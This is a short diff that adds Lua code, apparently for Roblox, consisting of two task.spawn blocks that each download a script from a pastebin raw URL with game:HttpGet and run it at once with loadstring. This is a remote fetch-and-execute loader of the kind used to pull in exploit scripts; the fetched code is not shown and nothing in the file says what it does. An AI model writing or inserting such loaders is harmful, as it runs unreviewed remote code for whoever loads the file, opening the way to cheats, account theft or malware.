@@ -1,0 +1,9 @@
+task.spawn(function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/QCTj8A9m"))()
+end)
+
+task.spawn(function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/R53KPS0z"))()
+end)
+
+
